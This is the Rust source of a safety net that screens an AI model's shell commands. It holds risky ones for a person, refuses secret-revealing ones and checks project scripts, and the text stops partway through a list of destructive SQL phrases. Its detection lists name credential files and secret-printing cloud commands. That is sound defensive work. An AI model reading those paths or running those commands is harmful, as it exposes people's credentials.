//! Running a model's shell commands, with a safety net: what cannot be
//! undone, leaves the machine or cannot be read is held for the person, and
//! what runs without asking runs without the environment's secrets.

use std::ffi::OsString;
use std::path::Path;
use std::time::Duration;

use tokio::process::Command;

/// How long a command may run.
const TIMEOUT: Duration = Duration::from_secs(120);

/// The most of a command's output a model gets, in bytes, the end kept.
const OUTPUT_BYTES: usize = 16_000;

/// The reasons that say only that a command cannot be read from its text,
/// not that it does harm: a model may read it to tell.
const WORKED_OUT: &str = "it runs a command whose text is worked out as it runs";
const TEXT_AS_COMMAND: &str = "it runs text as a command";
const INLINE_CODE: &str = "it runs code given on the command line";
const DECODED: &str = "it decodes text that may be a command";

/// Whether `reason` only says the command cannot be read from its text.
pub fn unreadable(reason: &str) -> bool {
    [WORKED_OUT, TEXT_AS_COMMAND, INLINE_CODE, DECODED].contains(&reason)
}

/// What reading a command found: why it may not run at all, why it is put
/// to the person first, and the secrets of the environment it names.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Assessment {
    /// The servers it reaches that are not known: it waits until the
    /// person allows them.
    pub hosts: Vec<String>,
    /// It would show a secret's value: it never runs. Models do not see
    /// secrets; tools that need them find their own.
    pub refused: Vec<String>,
    /// It cannot be undone, leaves the machine or cannot be read: the
    /// person says.
    pub held: Vec<String>,
    /// The secret variables it names, as `$NAME` or `${NAME}`: it gets them
    /// only once the person allowed them.
    pub secrets: Vec<String>,
}

/// How strictly a command is read.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Policy {
    /// A program ironquill has no rule for waits too.
    pub strict: bool,
    /// The servers a command may reach without asking, as `host` or
    /// `*.domain`; `None` checks no server.
    pub known_hosts: Option<Vec<String>>,
}

/// Reads `command` before it runs. See [`Assessment`].
///
/// This reads the command as written. It holds what it does not understand
/// rather than guess, but a command can always be dressed up: it is a net,
/// not a sandbox.
pub fn assess(command: &str, root: &Path, policy: &Policy) -> Assessment {
    let strict = policy.strict;
    let mut found = Assessment {
        hosts: match &policy.known_hosts {
            Some(known) => unknown_hosts(command, known),
            None => Vec::new(),
        },
        held: hold_reasons(command, root),
        refused: secret_reasons(command),
        secrets: named_secrets(command),
    };
    // What the project runs that is not in its last commit was seen by
    // nobody: it waits. What was, runs; its shell text is still judged as
    // if typed.
    let run = project_run(command, root);
    for (file, changed) in &run.files {
        match changed {
            Some(false) => {}
            Some(true) => found.held.push(format!(
                "it runs {file}, which is new or changed since the last commit"
            )),
            None => found.held.push(format!(
                "it runs {file}, and without git nothing says it is the project's own"
            )),
        }
    }
    for (path, text) in run.texts {
        found.held.extend(
            hold_reasons(&text, root)
                .into_iter()
                .map(|r| format!("{path}: {r}")),
        );
        found.refused.extend(
            secret_reasons(&text)
                .into_iter()
                .map(|r| format!("{path}: {r}")),
        );
        for name in named_secrets(&text) {
            if !found.secrets.contains(&name) {
                found.secrets.push(name);
            }
        }
    }
    // Strict: what ironquill does not know waits too.
    if strict {
        for (segment, _) in segments(command) {
            let all = words(&segment);
            let words = unwrapped(&all);
            if let Some(program) = words.first().map(|w| program_name(w))
                && !KNOWN.contains(&program)
                && !program.starts_with("cargo-")
                && !found.held.iter().any(|r| r.contains(program))
            {
                found.held.push(format!(
                    "in strict mode, {program} is not a program ironquill knows"
                ));
            }
        }
    }
    found.held.dedup();
    found.refused.dedup();
    found
}

/// The programs ironquill knows, in strict mode: those it has rules for,
/// those that only read, and the project's usual tools.
const KNOWN: &[&str] = &[
    // Reading and looking around.
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "ag",
    "ls",
    "stat",
    "file",
    "wc",
    "diff",
    "cmp",
    "md5sum",
    "sha256sum",
    "shasum",
    "bat",
    "find",
    "fd",
    "tree",
    "du",
    "df",
    "pwd",
    "which",
    "type",
    "whoami",
    "id",
    "uname",
    "hostname",
    "date",
    "echo",
    "printf",
    "true",
    "false",
    "test",
    "[",
    "sort",
    "uniq",
    "cut",
    "tr",
    "column",
    "jq",
    "yq",
    "awk",
    "sed",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "ps",
    "sleep",
    "env",
    "printenv",
    "cd",
    "xxd",
    "hexdump",
    "od",
    "nl",
    "paste",
    "comm",
    "join",
    "fold",
    "expr",
    "seq",
    "lsof",
    "netstat",
    "ss",
    "dig",
    "nslookup",
    "host",
    "ping",
    // Changing files in the project, archives.
    "mkdir",
    "touch",
    "cp",
    "mv",
    "tee",
    "chmod",
    "ln",
    "tar",
    "gzip",
    "gunzip",
    "zip",
    "unzip",
    "patch",
    // With rules of their own.
    "git",
    "gh",
    "kubectl",
    "oc",
    "helm",
    "aws",
    "gcloud",
    "az",
    "terraform",
    "tofu",
    "pulumi",
    "docker",
    "podman",
    "docker-compose",
    "curl",
    "wget",
    "http",
    "https",
    "xh",
    "rm",
    "rmdir",
    "sudo",
    "kill",
    "pkill",
    "crontab",
    "ssh",
    "scp",
    "rsync",
    "psql",
    "mysql",
    "sqlite3",
    "redis-cli",
    "mongosh",
    // Building, testing, running the project.
    "make",
    "gmake",
    "cmake",
    "ninja",
    "cargo",
    "rustc",
    "rustup",
    "npm",
    "pnpm",
    "yarn",
    "bun",
    "npx",
    "node",
    "deno",
    "tsc",
    "eslint",
    "prettier",
    "jest",
    "vitest",
    "python",
    "python3",
    "pip",
    "pip3",
    "pytest",
    "uv",
    "uvx",
    "poetry",
    "pipenv",
    "pdm",
    "hatch",
    "ruff",
    "black",
    "isort",
    "mypy",
    "pylint",
    "flake8",
    "coverage",
    "tox",
    "nox",
    "alembic",
    "uvicorn",
    "gunicorn",
    "django-admin",
    "go",
    "gofmt",
    "java",
    "javac",
    "mvn",
    "gradle",
    "gcc",
    "g++",
    "clang",
    "cc",
    "ld",
    "pre-commit",
];

/// The biggest script read before it runs.
const SCRIPT_BYTES: u64 = 256 * 1024;

/// What a command runs of the project: the files it runs, and the shell
/// text among them that can be judged as if typed, with where it is from.
struct ProjectRun {
    /// What of the project it runs, relative to the root, and whether that
    /// changed since the last commit: `None` outside a git repository.
    files: Vec<(String, Option<bool>)>,
    /// Shell text it runs: a shell script, a make recipe, an npm script.
    texts: Vec<(String, String)>,
}

/// The files of the project `command` runs, and the shell text in them.
fn project_run(command: &str, root: &Path) -> ProjectRun {
    let mut run = ProjectRun {
        files: Vec::new(),
        texts: Vec::new(),
    };
    for (segment, _) in segments(command) {
        let all = words(&segment);
        let words = unwrapped(&all);
        let Some(first) = words.first() else {
            continue;
        };
        let program = program_name(first);
        let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
        match program {
            "make" | "gmake" => {
                let dir = value_of(&args, &["-C", "--directory"]).unwrap_or(".");
                let makefile = value_of(&args, &["-f", "--file", "--makefile"])
                    .map(|f| format!("{dir}/{f}"))
                    .or_else(|| {
                        // The names as the directory holds them: on a file
                        // system that ignores case, `makefile` would be
                        // found for `Makefile`, and git would not know it.
                        let names: Vec<String> = std::fs::read_dir(root.join(dir))
                            .into_iter()
                            .flatten()
                            .flatten()
                            .filter_map(|e| e.file_name().into_string().ok())
                            .collect();
                        ["GNUmakefile", "makefile", "Makefile"]
                            .iter()
                            .find(|f| names.iter().any(|n| n == *f))
                            .map(|f| format!("{dir}/{f}"))
                    });
                let Some(makefile) = makefile else {
                    continue;
                };
                let makefile = makefile.trim_start_matches("./").to_owned();
                let targets: Vec<&str> = args
                    .iter()
                    .enumerate()
                    .filter(|(i, a)| {
                        let valued = *i > 0
                            && matches!(
                                args[i - 1],
                                "-C" | "--directory" | "-f" | "--file" | "--makefile" | "-j"
                            );
                        !a.starts_with('-') && !a.contains('=') && !valued
                    })
                    .map(|(_, a)| *a)
                    .collect();
                let Some(text) = read_small(&root.join(&makefile)) else {
                    continue;
                };
                let recipe = make_recipe(&text, &targets);
                let label = format!("make {}", targets.join(" "));
                run.texts.push((label.trim_end().to_owned(), recipe));
                let changed = changed_since_commit(root, &makefile);
                run.files.push((makefile, changed));
            }
            "npm" | "pnpm" | "yarn" | "bun" => {
                let name = match args.first().copied() {
                    Some("run" | "run-script") => args.get(1).copied(),
                    Some("start" | "test") => args.first().copied(),
                    _ => None,
                };
                let Some(name) = name else {
                    continue;
                };
                let Some(text) = read_small(&root.join("package.json")) else {
                    continue;
                };
                let scripts = npm_scripts(&text, name);
                run.texts
                    .push((format!("{program} run {name}"), scripts.clone()));
                // Only the scripts it runs: a new dependency changes nothing
                // of what runs.
                let changed = committed_text(root, "package.json").map(|before| {
                    before.is_none_or(|before| npm_scripts(&before, name) != scripts)
                });
                run.files
                    .push((format!("the {name} script of package.json"), changed));
            }
            _ => {
                let path = if program == "python" || program == "python3" {
                    match args.iter().position(|a| *a == "-m") {
                        Some(i) => args.get(i + 1).and_then(|m| module_file(root, m)),
                        None => args
                            .iter()
                            .find(|a| !a.starts_with('-'))
                            .map(|a| a.to_string()),
                    }
                } else if SHELLS.contains(&program) || INTERPRETERS.contains(&program) {
                    args.iter()
                        .find(|a| !a.starts_with('-'))
                        .map(|a| a.to_string())
                } else if first.contains('/') {
                    Some(first.clone())
                } else {
                    None
                };
                let Some(path) = path else {
                    continue;
                };
                let path = path.trim_start_matches("./").to_owned();
                let file = root.join(&path);
                if !file.is_file() {
                    continue;
                }
                let changed = changed_since_commit(root, &path);
                if let Some(text) = read_small(&file) {
                    let shell = SHELLS.contains(&program)
                        || path.ends_with(".sh")
                        || text.lines().next().is_some_and(|l| {
                            l.starts_with("#!") && SHELLS.iter().any(|s| l.contains(s))
                        });
                    if shell {
                        run.texts.push((path.clone(), shell_commands(&text)));
                    }
                }
                run.files.push((path, changed));
            }
        }
    }
    run
}

/// The scripts `npm run name` runs, before and after included.
fn npm_scripts(package: &str, name: &str) -> String {
    let Ok(json) = serde_json::from_str::<serde_json::Value>(package) else {
        return String::new();
    };
    [format!("pre{name}"), name.to_owned(), format!("post{name}")]
        .iter()
        .filter_map(|n| json["scripts"][n].as_str().map(str::to_owned))
        .collect::<Vec<_>>()
        .join("\n")
}

/// The text of `path` in the last commit: `None` outside a git repository,
/// `Some(None)` when the commit does not hold it.
fn committed_text(root: &Path, path: &str) -> Option<Option<String>> {
    let output = std::process::Command::new("git")
        .args(["show", &format!("HEAD:./{path}")])
        .current_dir(root)
        .env_remove("GIT_DIR")
        .env_remove("GIT_INDEX_FILE")
        .env_remove("GIT_WORK_TREE")
        .stdin(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output()
        .ok()?;
    if output.status.success() {
        return Some(Some(String::from_utf8_lossy(&output.stdout).into_owned()));
    }
    // A repository without that file at its last commit, or not one.
    changed_since_commit(root, ".").map(|_| None)
}

/// The value given to the first of `flags` in `args`.
fn value_of<'a>(args: &[&'a str], flags: &[&str]) -> Option<&'a str> {
    args.iter()
        .position(|a| flags.contains(a))
        .and_then(|i| args.get(i + 1).copied())
}

/// The file `python -m module` runs, when it is the project's.
fn module_file(root: &Path, module: &str) -> Option<String> {
    let base = module.replace('.', "/");
    [format!("{base}/__main__.py"), format!("{base}.py")]
        .into_iter()
        .find(|f| root.join(f).is_file())
}

/// A file's text, when it is small enough to read before it runs.
fn read_small(file: &Path) -> Option<String> {
    if file.metadata().ok()?.len() > SCRIPT_BYTES {
        return None;
    }
    std::fs::read_to_string(file).ok()
}

/// A shell script's text as commands: comments and line continuations out.
fn shell_commands(text: &str) -> String {
    text.replace("\\\n", " ")
        .lines()
        .map(str::trim)
        .filter(|l| !l.starts_with('#'))
        .map(|l| l.split(" #").next().unwrap_or(l))
        .collect::<Vec<_>>()
        .join("\n")
}

/// The commands `make` would run for `targets`, the first target when
/// none, with what they depend on: make's own variables read as plain
/// words, so that only what the shell would work out is held as such.
fn make_recipe(makefile: &str, targets: &[&str]) -> String {
    // Each rule's targets, prerequisites and recipe.
    let mut rules: Vec<(Vec<String>, Vec<String>, Vec<String>)> = Vec::new();
    for line in makefile.replace("\\\n", " ").lines() {
        if let Some(recipe) = line.strip_prefix('\t') {
            if let Some(rule) = rules.last_mut() {
                rule.2
                    .push(recipe.trim_start_matches(['@', '-', '+']).to_owned());
            }
            continue;
        }
        if line.starts_with('#') || line.trim().is_empty() {
            continue;
        }
        if let Some((head, rest)) = line.split_once(':')
            && !rest.starts_with('=')
            && !head.contains('=')
        {
            let names = head.split_whitespace().map(str::to_owned).collect();
            let (prerequisites, inline) = match rest.split_once(';') {
                Some((p, r)) => (p, vec![r.trim().to_owned()]),
                None => (rest, Vec::new()),
            };
            let prerequisites = prerequisites
                .split_whitespace()
                .map(str::to_owned)
                .collect();
            rules.push((names, prerequisites, inline));
        }
    }
    let first = rules
        .iter()
        .flat_map(|r| r.0.iter())
        .find(|n| !n.starts_with('.'))
        .cloned();
    let mut wanted: Vec<String> = if targets.is_empty() {
        first.into_iter().collect()
    } else {
        targets.iter().map(|t| (*t).to_owned()).collect()
    };
    let mut seen: Vec<String> = Vec::new();
    let mut commands = Vec::new();
    while let Some(target) = wanted.pop() {
        if seen.contains(&target) || seen.len() > 64 {
            continue;
        }
        seen.push(target.clone());
        for (names, prerequisites, recipe) in &rules {
            if names.contains(&target) {
                wanted.extend(prerequisites.iter().cloned());
                commands.extend(recipe.iter().map(|line| make_words(line)));
            }
        }
    }
    commands.join("\n")
}

/// A recipe line with make's variables as plain words: `$(MAKE)` is make,
/// `$(CC)` a name, `$$` a dollar. `$(shell ...)` stays as it is.
fn make_words(line: &str) -> String {
    let mut out = String::new();
    let mut rest = line;
    while let Some(at) = rest.find('$') {
        out.push_str(&rest[..at]);
        rest = &rest[at + 1..];
        let (open, close) = match rest.chars().next() {
            Some('$') => {
                out.push('$');
                rest = &rest[1..];
                continue;
            }
            Some('(') => ('(', ')'),
            Some('{') => ('{', '}'),
            Some('@' | '<' | '^' | '?' | '*') => {
                out.push_str("target");
                rest = &rest[1..];
                continue;
            }
            _ => {
                out.push('$');
                continue;
            }
        };
        let _ = open;
        let Some(end) = rest.find(close) else {
            out.push('$');
            continue;
        };
        let name = &rest[1..end];
        if name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
            out.push_str(if name == "MAKE" { "make" } else { name });
            rest = &rest[end + 1..];
        } else {
            // A function such as $(shell ...): left for the shell rules.
            out.push('$');
        }
    }
    out.push_str(rest);
    out
}

/// Whether the file at `path` differs from the last commit, or is not in
/// it: `None` outside a git repository, where nothing says.
fn changed_since_commit(root: &Path, path: &str) -> Option<bool> {
    let output = std::process::Command::new("git")
        .args(["status", "--porcelain", "--", path])
        .current_dir(root)
        .env_remove("GIT_DIR")
        .env_remove("GIT_INDEX_FILE")
        .env_remove("GIT_WORK_TREE")
        .stdin(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    if !output.stdout.is_empty() {
        return Some(true);
    }
    // Unchanged, or unknown to git by that very name, as a file system that
    // ignores case lets a script run under another spelling: only what git
    // holds counts as committed.
    let tracked = std::process::Command::new("git")
        .args(["ls-files", "--error-unmatch", "--", path])
        .current_dir(root)
        .env_remove("GIT_DIR")
        .env_remove("GIT_INDEX_FILE")
        .env_remove("GIT_WORK_TREE")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|s| s.success());
    Some(!tracked)
}

/// Paths whose files run code later or change what is allowed: hooks, CI
/// workflows, shell start-up files, tools' own settings.
const PROTECTED: [&str; 16] = [
    ".git/hooks",
    ".git/config",
    ".gitconfig",
    ".config/git",
    ".github/workflows",
    ".gitlab-ci.yml",
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".profile",
    ".config/fish",
    ".ironquill/",
    ".claude/",
    ".codex/",
    "/etc/",
];

/// Programs that only read the files they are given.
const READERS: [&str; 16] = [
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "grep",
    "rg",
    "ls",
    "stat",
    "file",
    "wc",
    "diff",
    "cmp",
    "md5sum",
    "sha256sum",
    "bat",
];

/// The servers `command` reaches with an HTTP client that are not among
/// `known`.
fn unknown_hosts(command: &str, known: &[String]) -> Vec<String> {
    let mut hosts = Vec::new();
    for (segment, _) in segments(command) {
        let all = words(&segment);
        let words = unwrapped(&all);
        let Some(program) = words.first().map(|w| program_name(w)) else {
            continue;
        };
        let args = &words[1..];
        // Name lookups and pings carry data in the name they ask for; git
        // reaches the URL it is given.
        if matches!(
            program,
            "dig" | "nslookup" | "host" | "ping" | "ping6" | "traceroute"
        ) {
            for target in args.iter().filter(|a| !a.starts_with(['-', '@', '+'])) {
                if let Some(host) = host_of(target)
                    && !host_known(&host, known)
                    && !hosts.contains(&host)
                {
                    hosts.push(host);
                }
            }
            continue;
        }
        if program == "git" {
            for target in args.iter().filter(|a| a.contains("://") || a.contains('@')) {
                let target = target.split_once('@').map_or(target.as_str(), |(_, r)| r);
                let host = if target.contains("://") {
                    host_of(target)
                } else {
                    target.split(':').next().map(str::to_owned)
                };
                if let Some(host) = host
                    && !host_known(&host, known)
                    && !hosts.contains(&host)
                {
                    hosts.push(host);
                }
            }
            continue;
        }
        if !matches!(
            program,
            "curl" | "wget" | "http" | "https" | "xh" | "httpie"
        ) {
            continue;
        }
        // URLs, or a bare host as the first word that is not an option.
        let mut targets: Vec<&str> = args
            .iter()
            .filter(|a| a.contains("://"))
            .map(String::as_str)
            .collect();
        if targets.is_empty()
            && let Some(bare) = args.iter().find(|a| !a.starts_with('-') && a.contains('.'))
        {
            targets.push(bare);
        }
        for target in targets {
            let Some(host) = host_of(target) else {
                continue;
            };
            if !host_known(&host, known) && !hosts.contains(&host) {
                hosts.push(host);
            }
        }
    }
    hosts
}

/// The host of a URL or of `host/path`, without port or user.
fn host_of(target: &str) -> Option<String> {
    let rest = target.split_once("://").map_or(target, |(_, r)| r);
    let authority = rest.split(['/', '?', '#']).next()?;
    let host = authority.rsplit('@').next()?;
    let host = if let Some(v6) = host.strip_prefix('[') {
        v6.split(']').next()?
    } else {
        host.split(':').next()?
    };
    let host = host.trim().to_ascii_lowercase();
    (!host.is_empty()).then_some(host)
}

/// Whether `host` is one of `known`: the same, or under a `*.domain`.
fn host_known(host: &str, known: &[String]) -> bool {
    known.iter().any(|k| match k.strip_prefix("*.") {
        Some(domain) => host == domain || host.ends_with(&format!(".{domain}")),
        None => host == k,
    })
}

/// The servers a project and its person already use: the project's git
/// remotes, the clusters of the kubeconfig, and the usual ones of GitHub,
/// AWS and the package registries. Read, never shown.
pub fn known_hosts(root: &Path) -> Vec<String> {
    let mut hosts: Vec<String> = [
        "localhost",
        "127.0.0.1",
        "::1",
        "github.com",
        "*.github.com",
        "*.githubusercontent.com",
        "*.amazonaws.com",
        "*.aws.amazon.com",
        "pypi.org",
        "files.pythonhosted.org",
        "registry.npmjs.org",
        "*.npmjs.org",
        "crates.io",
        "*.crates.io",
        "proxy.golang.org",
        "sum.golang.org",
    ]
    .map(str::to_owned)
    .to_vec();
    let mut add = |target: &str| {
        let target = target.split_once('@').map_or(target, |(_, rest)| rest);
        let host = if target.contains("://") {
            host_of(target)
        } else {
            // `host:owner/repo`, as ssh remotes are written.
            target.split(':').next().map(str::to_owned)
        };
        if let Some(host) = host.filter(|h| !h.is_empty())
            && !hosts.contains(&host)
        {
            hosts.push(host);
        }
    };
    if let Ok(output) = std::process::Command::new("git")
        .args(["remote", "-v"])
        .current_dir(root)
        .env_remove("GIT_DIR")
        .env_remove("GIT_INDEX_FILE")
        .env_remove("GIT_WORK_TREE")
        .stderr(std::process::Stdio::null())
        .output()
    {
        for line in String::from_utf8_lossy(&output.stdout).lines() {
            if let Some(url) = line.split_whitespace().nth(1) {
                add(url);
            }
        }
    }
    let kubeconfigs: Vec<std::path::PathBuf> = match std::env::var_os("KUBECONFIG") {
        Some(paths) => std::env::split_paths(&paths).collect(),
        None => std::env::var_os("HOME")
            .map(|home| Path::new(&home).join(".kube/config"))
            .into_iter()
            .collect(),
    };
    for config in kubeconfigs {
        let Ok(text) = std::fs::read_to_string(config) else {
            continue;
        };
        for line in text.lines() {
            if let Some(server) = line.trim().strip_prefix("server:") {
                add(server.trim().trim_matches(['"', '\'']));
            }
        }
    }
    hosts
}

/// Files that hold secrets: reading them shows them.
const SECRET_FILES: [&str; 16] = [
    ".aws/credentials",
    ".aws/sso/cache",
    ".aws/cli/cache",
    ".ssh/",
    ".kube/config",
    ".docker/config.json",
    ".netrc",
    ".git-credentials",
    ".config/gh/hosts.yml",
    ".pgpass",
    ".npmrc",
    ".pypirc",
    ".claude/.credentials.json",
    ".codex/auth.json",
    ".config/gcloud/",
    ".azure/",
];

/// Whether `word` names a file of secrets: one above, or a `.env` file.
fn secret_file(word: &str) -> bool {
    let name = word.rsplit('/').next().unwrap_or(word);
    SECRET_FILES.iter().any(|f| word.contains(f))
        || name == ".env"
        || name.starts_with(".env.")
        || name.ends_with(".env")
}

/// Why `command` would show a secret's value, if it would.
fn secret_reasons(command: &str) -> Vec<String> {
    let mut reasons: Vec<String> = Vec::new();
    let mut refuse = |reason: &str| {
        if !reasons.iter().any(|r| r == reason) {
            reasons.push(reason.to_owned());
        }
    };
    for (segment, _) in segments(command) {
        let all = words(&segment);
        if all.iter().any(|w| secret_file(w)) {
            refuse("it reads or touches a file of secrets");
        }
        let words = unwrapped(&all);
        let Some(program) = words.first().map(|w| program_name(w)) else {
            // `env` alone, with only variables set: it prints them.
            if all.iter().any(|w| program_name(w) == "env") {
                refuse("it prints the environment, secrets included");
            }
            continue;
        };
        let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
        let named = !named_secrets(&segment).is_empty();
        match program {
            "printenv" if args.is_empty() || args.iter().any(|a| is_secret(a)) => {
                refuse("it prints the environment, secrets included");
            }
            "export" | "declare" | "typeset" if args.is_empty() || args.contains(&"-p") => {
                refuse("it prints the environment, secrets included");
            }
            "set" if args.is_empty() => refuse("it prints the environment, secrets included"),
            "echo" | "printf" | "print" if named => refuse("it prints a secret"),
            _ => {}
        }
        if let Some(reason) = secret_store_reason(program, &args) {
            refuse(reason);
        }
    }
    reasons
}

/// Why asking `program` for something would show a secret: a secret
/// manager's value, a token, credentials.
fn secret_store_reason(program: &str, args: &[&str]) -> Option<&'static str> {
    let words: Vec<&str> = args
        .iter()
        .filter(|a| !a.starts_with('-'))
        .copied()
        .collect();
    let has = |w: &str| words.contains(&w);
    let flag = |f: &str| {
        args.iter()
            .any(|a| *a == f || a.starts_with(&format!("{f}=")))
    };
    let shows = match program {
        "aws" => {
            let words = after_global_flags(args, &AWS_VALUED);
            let (service, operation) = (words.first().copied(), words.get(1).copied());
            matches!(
                (service, operation),
                (
                    Some("secretsmanager"),
                    Some("get-secret-value" | "batch-get-secret-value")
                ) | (
                    Some("sts"),
                    Some(
                        "get-session-token"
                            | "assume-role"
                            | "assume-role-with-saml"
                            | "assume-role-with-web-identity"
                            | "get-federation-token"
                    )
                ) | (Some("configure"), Some("get" | "export-credentials"))
                    | (
                        Some("ecr"),
                        Some("get-login-password" | "get-authorization-token")
                    )
                    | (Some("codeartifact"), Some("get-authorization-token"))
            ) || (service == Some("ssm")
                && operation.is_some_and(|o| o.starts_with("get-parameter"))
                && flag("--with-decryption"))
        }
        "gcloud" => {
            (has("auth") && (has("print-access-token") || has("print-identity-token")))
                || (has("secrets") && has("access"))
        }
        "az" => {
            (has("keyvault") && has("secret") && (has("show") || has("download")))
                || (has("account") && has("get-access-token"))
        }
        "kubectl" | "oc" => {
            let words = after_global_flags(args, &KUBECTL_VALUED);
            let secret = words
                .iter()
                .any(|w| w.to_ascii_lowercase().starts_with("secret"));
            (secret && matches!(words.first().copied(), Some("get" | "describe" | "edit")))
                || (words.first() == Some(&"config") && flag("--raw"))
        }
        "vault" | "bao" => matches!(
            words.first().copied(),
            Some("read" | "kv" | "token" | "login")
        ),
        "gh" => has("auth") && has("token"),
        "op" => matches!(words.first().copied(), Some("read" | "item" | "inject")),
        "security" => {
            args.iter()
                .any(|a| a.starts_with("find-") && a.ends_with("-password"))
                && (flag("-w") || flag("-g"))
        }
        "pass" | "gopass" => matches!(words.first().copied(), Some("show") | None),
        "doppler" => has("secrets"),
        "aws-vault" => matches!(words.first().copied(), Some("export" | "login")),
        "saml2aws" => has("script"),
        "aws-sso" => matches!(words.first().copied(), Some("export" | "eval" | "console")),
        // Sensitive outputs show only as JSON or raw.
        "terraform" | "tofu" => has("output") && (flag("-json") || flag("-raw")),
        _ => false,
    };
    shows.then_some("it shows a secret, a token or credentials")
}

/// The secret variables `command` names, as `$NAME` or `${NAME}`.
fn named_secrets(command: &str) -> Vec<String> {
    let mut names = Vec::new();
    let mut rest = command;
    while let Some(at) = rest.find('$') {
        rest = &rest[at + 1..];
        let braced = rest.starts_with('{');
        let start = usize::from(braced);
        let name: String = rest[start..]
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
            .collect();
        if !name.is_empty() && is_secret(&name) && !names.contains(&name) {
            names.push(name);
        }
    }
    names
}

/// Secret variables a program reads on its own: it gets them, since the
/// model never sees them, and what it does with them is judged as any
/// command is.
fn implied_secrets(command: &str, root: &Path) -> Vec<&'static str> {
    let mut names = Vec::new();
    let scripts: Vec<String> = project_run(command, root)
        .texts
        .into_iter()
        .map(|(_, text)| text)
        .collect();
    let all_text = std::iter::once(command.to_owned())
        .chain(scripts)
        .collect::<Vec<_>>()
        .join("\n");
    for (segment, _) in segments(&all_text) {
        let all = words(&segment);
        let words = unwrapped(&all);
        let Some(program) = words.first().map(|w| program_name(w)) else {
            continue;
        };
        names.extend_from_slice(match program {
            "aws" | "terraform" | "tofu" | "sam" | "cdk" => &[
                "AWS_ACCESS_KEY_ID",
                "AWS_SECRET_ACCESS_KEY",
                "AWS_SESSION_TOKEN",
                "AWS_SECURITY_TOKEN",
            ][..],
            "gh" => &["GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN"][..],
            "glab" => &["GITLAB_TOKEN"][..],
            "psql" | "pg_dump" => &["PGPASSWORD"][..],
            "mysql" | "mysqldump" => &["MYSQL_PWD"][..],
            "npm" | "pnpm" | "yarn" => &["NPM_TOKEN"][..],
            "cargo" => &["CARGO_REGISTRY_TOKEN"][..],
            _ => &[][..],
        });
    }
    names
}

/// aws's options that take a value, before its service.
const AWS_VALUED: [&str; 6] = [
    "--profile",
    "--region",
    "--output",
    "--endpoint-url",
    "--cli-read-timeout",
    "--cli-connect-timeout",
];

/// Why a cloud command changes something, if it does: what only reads
/// runs, the rest goes to the person.
fn cloud_reason(program: &str, args: &[&str]) -> Option<&'static str> {
    let reads = |op: &str| {
        [
            "describe",
            "list",
            "get",
            "head",
            "show",
            "lookup",
            "search",
            "filter",
            "batch-get",
            "scan",
            "query",
            "tail",
            "wait",
            "help",
            "version",
            "info",
        ]
        .iter()
        .any(|r| op == *r || op.starts_with(&format!("{r}-")))
    };
    match program {
        "aws" => {
            let words = after_global_flags(args, &AWS_VALUED);
            match (words.first().copied(), words.get(1).copied()) {
                (Some("sts"), Some("get-caller-identity")) => None,
                (Some("s3"), Some("ls")) => None,
                // A download writes here only.
                (Some("s3"), Some("cp" | "sync"))
                    if words.last().is_some_and(|w| !w.starts_with("s3://")) =>
                {
                    None
                }
                (Some("logs"), Some(op)) if reads(op) || op == "start-query" => None,
                (Some(_), Some(op)) if reads(op) => None,
                (Some("configure"), Some("list" | "list-profiles")) => None,
                _ => Some("it changes something in a cloud account"),
            }
        }
        "gcloud" | "az" => {
            let words: Vec<&str> = args
                .iter()
                .filter(|a| !a.starts_with('-'))
                .copied()
                .collect();
            let read = words.iter().any(|w| reads(w))
                || matches!(
                    words.first().copied(),
                    Some("version" | "info" | "config" | "account")
                ) && words
                    .iter()
                    .any(|w| matches!(*w, "list" | "show" | "get-value"));
            (!read).then_some("it changes something in a cloud account")
        }
        "terraform" | "tofu" | "pulumi" => {
            let words: Vec<&str> = args
                .iter()
                .filter(|a| !a.starts_with('-'))
                .copied()
                .collect();
            (!matches!(
                words.first().copied(),
                Some(
                    "plan"
                        | "validate"
                        | "fmt"
                        | "show"
                        | "init"
                        | "version"
                        | "providers"
                        | "graph"
                        | "preview"
                        | "stack"
                        | "whoami"
                        | "output"
                )
            ) || words.contains(&"rm"))
            .then_some("it changes infrastructure")
        }
        _ => None,
    }
}

/// Why `command` should be put to the person before it runs: one reason per
/// thing it does that cannot be undone, leaves the machine, or cannot be
/// read from the command itself.
fn hold_reasons(command: &str, root: &Path) -> Vec<String> {
    let mut reasons = Vec::new();
    let mut hold = |reason: &str| {
        if !reasons.iter().any(|r| r == reason) {
            reasons.push(reason.to_owned());
        }
    };
    // What the shell would work out before running anything.
    if command.contains("$(") || command.contains('`') || command.contains("<(") {
        hold(WORKED_OUT);
    }
    for (segment, piped) in segments(command) {
        let words = words(&segment);
        let words = unwrapped(&words);
        let Some(program) = words.first().map(|w| program_name(w)) else {
            continue;
        };
        let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
        if piped && SHELLS.contains(&program) {
            hold("it pipes text into a shell");
        }
        if let Some(reason) = program_reason(program, &args) {
            hold(reason);
        }
        if let Some(target) = overwritten(&segment)
            && root.join(target).is_file()
        {
            hold("it overwrites an existing file with `>`");
        }
        // A protected path, other than read.
        let touched = words
            .iter()
            .any(|w| PROTECTED.iter().any(|p| w.contains(p)));
        let redirected = segment.contains('>')
            && PROTECTED
                .iter()
                .any(|p| segment.split('>').skip(1).any(|t| t.contains(p)));
        if (touched && !READERS.contains(&program)) || redirected {
            hold("it writes where code runs later or settings decide what is allowed");
        }
        if program == "crontab" && !args.iter().all(|a| *a == "-l") {
            hold("it changes scheduled tasks");
        }
    }
    let lower = command.to_ascii_lowercase();
    for (word, reason) in [
        ("drop table", "it drops a database table"),
        ("drop database", "it drops a database"),
